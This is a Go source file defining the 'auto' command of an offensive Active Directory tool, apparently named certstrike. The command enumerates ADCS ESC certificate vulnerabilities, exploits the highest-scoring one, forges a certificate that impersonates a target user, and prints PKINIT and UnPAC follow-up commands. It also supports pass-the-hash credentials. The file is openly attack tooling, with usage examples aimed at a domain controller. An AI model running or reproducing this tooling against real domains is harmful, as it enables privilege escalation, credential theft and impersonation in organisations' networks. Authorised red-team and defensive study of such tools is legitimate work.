package main

import (
	"fmt"

	"github.com/loudmumble/certstrike/pkg/pki"
	"github.com/spf13/cobra"
)

var autoCmd = &cobra.Command{
	Use:   "auto",
	Short: "Auto-pwn — enumerate, exploit, forge in one command",
	Long: `Automatically enumerate all ESC vulnerabilities, exploit the highest-scoring
path, forge a certificate, and output PKINIT commands.

Examples:
  certstrike auto --target-dc dc01.corp.local --domain corp.local --upn admin@corp.local -u user -p pass
  certstrike auto --dry-run --target-dc dc01.corp.local --domain corp.local --upn admin@corp.local -u user -p pass
  certstrike auto --target-dc dc01.corp.local --domain corp.local --upn admin@corp.local --attacker-dn "CN=user,CN=Users,DC=corp,DC=local" -u user -p pass`,
	RunE: func(cmd *cobra.Command, args []string) error {
		targetDC, _ := cmd.Flags().GetString("target-dc")
		domain, _ := cmd.Flags().GetString("domain")
		username, _ := cmd.Flags().GetString("username")
		password, _ := cmd.Flags().GetString("password")
		hash, _ := cmd.Flags().GetString("hash")
		upn, _ := cmd.Flags().GetString("upn")
		attackerDN, _ := cmd.Flags().GetString("attacker-dn")
		outputDir, _ := cmd.Flags().GetString("output-dir")
		dryRun, _ := cmd.Flags().GetBool("dry-run")

		if targetDC == "" || domain == "" {
			return fmt.Errorf("--target-dc and --domain are required")
		}
		if upn == "" {
			return fmt.Errorf("--upn is required (target user to impersonate)")
		}
		if outputDir == "" {
			outputDir = "./certstrike-output"
		}

		cfg := &pki.AutoPwnConfig{
			ADCSConfig: &pki.ADCSConfig{
				TargetDC: targetDC, Domain: domain,
				Username: username, Password: password, Hash: hash,
			},
			TargetUPN:  upn,
			AttackerDN: attackerDN,
			OutputDir:  outputDir,
			DryRun:     dryRun,
		}

		result, err := pki.AutoPwn(cfg)
		if err != nil {
			return err
		}

		if result == nil {
			fmt.Println("[*] No exploitable paths found (or dry-run completed)")
			return nil
		}

		// Print PKINIT commands
		pki.PrintPKINITCommands(&pki.PKINITInfo{
			CertPath:  result.CertPath,
			KeyPath:   result.KeyPath,
			PFXPath:   result.PFXPath,
			DC:        targetDC,
			Domain:    domain,
			TargetUPN: upn,
		})

		// Print UnPAC commands
		if result.PFXPath != "" {
			pki.PrintUnPACCommands(result.PFXPath, targetDC, domain, upn)
		}

		return nil
	},
}

func init() {
	rootCmd.AddCommand(autoCmd)

	autoCmd.Flags().String("target-dc", "", "Target domain controller")
	autoCmd.Flags().String("domain", "", "Active Directory domain")
	autoCmd.Flags().StringP("username", "u", "", "Domain username")
	autoCmd.Flags().StringP("password", "p", "", "Domain password")
	autoCmd.Flags().String("hash", "", "NTLM hash for pass-the-hash")
	autoCmd.Flags().String("upn", "", "Target UPN to impersonate (required)")
	autoCmd.Flags().String("attacker-dn", "", "Attacker's LDAP DN (needed for ESC9)")
	autoCmd.Flags().String("output-dir", "./certstrike-output", "Output directory for certs")
	autoCmd.Flags().Bool("dry-run", false, "Enumerate and plan only, don't exploit")
}
